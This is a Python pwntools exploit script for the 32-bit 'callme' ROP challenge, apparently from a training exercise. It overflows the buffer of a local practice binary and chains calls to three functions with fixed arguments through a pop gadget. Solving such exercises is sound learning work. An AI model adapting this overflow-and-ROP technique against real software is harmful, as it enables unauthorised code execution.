from pwn import * 

binary = "./callme32"

r = process(binary)
p = ELF(binary)

callme_one_addr = p.symbols["callme_one"]
callme_two_addr = p.symbols["callme_two"]
callme_three_addr = p.symbols["callme_three"]

log.info("Call me one : " + hex(callme_one_addr))
log.info("Call me two : " + hex(callme_two_addr))
log.info("Call me three : " + hex(callme_three_addr))

args = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)


# python3 /opt/tools/ROPgadget/ROPgadget.py --binary callme32
pop = p32(0x080487f9) 

pld = "A" * 40
pld += "B" * 4
pld += p32(callme_one_addr)
pld += pop
pld += args
pld += p32(callme_two_addr)
pld += pop
pld += args
pld += p32(callme_three_addr)
pld += pop
pld += args

print r.recv()

r.send(pld)

print r.recvall()
